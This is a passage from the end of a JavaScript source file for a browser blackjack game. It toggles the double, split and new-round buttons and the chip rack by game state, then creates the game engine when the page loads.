                if (hand[0].value === hand[1].value) {
                    canSplit = true;
                }
            }
        }
        if (btnDouble) btnDouble.style.display = canDouble ? 'inline-flex' : 'none';
        if (btnSplit) btnSplit.style.display = canSplit ? 'inline-flex' : 'none';

        if (btnNewRound) btnNewRound.style.display = isRoundOver ? 'inline-flex' : 'none';

        // Chips rack interaction
        const chipsRack = document.getElementById('bj-chips-rack');
        if (chipsRack) {
            chipsRack.style.opacity = isBetting ? '1' : '0.4';
            chipsRack.style.pointerEvents = isBetting ? 'auto' : 'none';
        }
    }
}

window.pragmaticBlackjack = new PragmaticBlackjackEngine();
window.addEventListener('DOMContentLoaded', () => {
    window.pragmaticBlackjack.updateUI();
});
